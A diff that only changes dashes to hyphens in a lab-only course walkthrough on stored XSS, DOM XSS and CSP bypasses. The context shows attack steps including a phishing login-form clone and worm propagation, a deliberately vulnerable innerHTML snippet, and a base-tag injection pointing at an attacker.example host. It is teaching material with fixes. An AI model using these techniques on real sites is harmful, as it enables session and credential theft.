@@ -1,10 +1,10 @@
-# Week 06: Attack walkthrough — Stored & DOM XSS, CSP Bypass
+# Week 06: Attack walkthrough - Stored & DOM XSS, CSP Bypass
 
 > ⚠️ **Lab only.**
 
 ---
 
-## The three XSS shapes — same family, very different exploit chains
+## The three XSS shapes - same family, very different exploit chains
 
 ```mermaid
 ---
@@ -43,12 +43,12 @@ The app stores user content (a comment, a profile field, a chat message) and ren
 2. Server stores it in DB.
 3. Victim loads the page.
 4. Server renders the stored string into HTML.
-5. Victim's browser executes the script — in the victim's session.
+5. Victim's browser executes the script - in the victim's session.
 ```
 
-The wormable risk: in a social-app context, a stored XSS in profile bios can hit every user who views the attacker's profile, and the payload can then *modify other profiles* — exponential spread. The 2005 MySpace Samy worm hit 1M users in 20 hours via stored XSS.
+The wormable risk: in a social-app context, a stored XSS in profile bios can hit every user who views the attacker's profile, and the payload can then *modify other profiles* - exponential spread. The 2005 MySpace Samy worm hit 1M users in 20 hours via stored XSS.
 
-### Finding stored XSS — checklist
+### Finding stored XSS - checklist
 
 Test every place that stores user input and renders it back later:
 
@@ -57,7 +57,7 @@ Test every place that stores user input and renders it back later:
 | Comments, reviews | Author name field (not just the comment body) |
 | Profile fields | Display name, bio, "website" URL, custom title |
 | Chat / DMs | The other user's render, not just yours |
-| Admin views | Admin sees content from regular users — privilege escalation surface |
+| Admin views | Admin sees content from regular users - privilege escalation surface |
 | Email rendering | Many web apps render email in-app; HTML emails can carry XSS |
 | Imported data | CSV uploads, file metadata, EXIF |
 | Filenames | Avatar uploads `<img onerror=...>.png` |
@@ -107,7 +107,7 @@ Replace the page content with a clone of the login form pointed at your server.
 
 In the same payload, *also* modify the victim's stored data so they spread the payload to their viewers. Use the legit API, no fancy tricks.
 
-### Variants — when the obvious tag is blocked
+### Variants - when the obvious tag is blocked
 
 | Filter | Bypass |
 |---|---|
@@ -132,9 +132,9 @@ const searchParam = new URLSearchParams(location.search).get('q');
 document.getElementById('result').innerHTML = "Results for: " + searchParam;
 ```
 
-The server returns the same HTML to everyone — no reflection. But the client-side JS reads from `location.search` (a **source**) and writes to `innerHTML` (a **sink**) without sanitization. The payload is executed entirely client-side.
+The server returns the same HTML to everyone - no reflection. But the client-side JS reads from `location.search` (a **source**) and writes to `innerHTML` (a **sink**) without sanitization. The payload is executed entirely client-side.
 
-### Sources and sinks — the language to learn
+### Sources and sinks - the language to learn
 
 **Sources** are places where attacker-controlled data enters JavaScript:
 
@@ -240,7 +240,7 @@ The sanitizer parses the HTML one way; the browser parses the *same string* diff
 
 The HTML standard has a hundred edge cases where the parsed tree depends on whether JavaScript is enabled, the surrounding context (HTML vs. SVG vs. MathML), and quoting rules. Sanitizers that work as standalone parsers miss these.
 
-**DOMPurify** specifically handles known mXSS classes — that's why it's the recommended sanitizer rather than rolling your own.
+**DOMPurify** specifically handles known mXSS classes - that's why it's the recommended sanitizer rather than rolling your own.
 
 ## Part 4: CSP bypasses
 
@@ -262,7 +262,7 @@ The "callback" parameter becomes valid JS prepended to the response. CSP allowed
 
 Modern CDNs have mostly purged JSONP endpoints. Older ones still expose them.
 
-### Bypass 2: `unsafe-inline` — the obvious one
+### Bypass 2: `unsafe-inline` - the obvious one
 
 ```
 script-src 'self' 'unsafe-inline'
@@ -292,7 +292,7 @@ If `base-uri` is permissive (or unset), inject a `<base>` tag:
 <base href="https://attacker.example/">
 ```
 
-Now every relative URL on the page resolves to the attacker's server, including subsequent `<script src="app.js">` loads. The page itself loads attacker-controlled JS — and CSP allowed it because `'self'` is now the attacker.
+Now every relative URL on the page resolves to the attacker's server, including subsequent `<script src="app.js">` loads. The page itself loads attacker-controlled JS - and CSP allowed it because `'self'` is now the attacker.
 
 Fix: `base-uri 'self'` or `base-uri 'none'`.
 
@@ -328,7 +328,7 @@ If CSP has a `report-uri` pointed at a same-origin endpoint and you can control 
 ## Common mistakes when learning
 
 - **Treating reflected and stored as the same problem.** Stored has a much wider blast radius and often wormable.
-- **Only testing the obvious sinks.** `dangerouslySetInnerHTML` is one — what about `v-html`, `setHTML`, `outerHTML` writes inside event handlers?
+- **Only testing the obvious sinks.** `dangerouslySetInnerHTML` is one - what about `v-html`, `setHTML`, `outerHTML` writes inside event handlers?
 - **Reading the CSP and stopping at "script-src 'self'."** That single line allows JSONP, allows base-tag attacks if `base-uri` is unset, and so on. Read the whole header.
 - **Forgetting that mobile WebViews have weaker CSP support.** Native apps embedding web content often disable CSP, and the in-app browser doesn't enforce it.
 - **Pasting payloads from a cheat-sheet without understanding context.** A payload that works inside `<div>` fails inside `<title>`, inside an attribute, inside a URL, inside JSON.
